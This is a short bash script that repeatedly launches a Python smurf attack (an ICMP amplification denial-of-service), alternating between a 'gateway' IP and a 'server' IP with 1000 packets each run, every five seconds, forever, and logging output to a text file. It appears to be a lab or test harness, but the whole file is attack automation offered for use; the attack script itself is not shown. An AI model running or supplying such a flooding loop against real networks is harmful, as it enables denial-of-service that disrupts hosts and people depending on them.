#!/bin/bash

gatewayIP="1.1.1.3"
serverIP="1.1.1.2"

while true; do

	sudo python smurfattack.py 1.1.1.3 1.1.1.2 1000 >> smurfattack.txt
	sleep 5; 
	sudo python smurfattack.py 1.1.1.2 1.1.1.3 1000 >> smurfattack.txt
	sleep 5;	

done
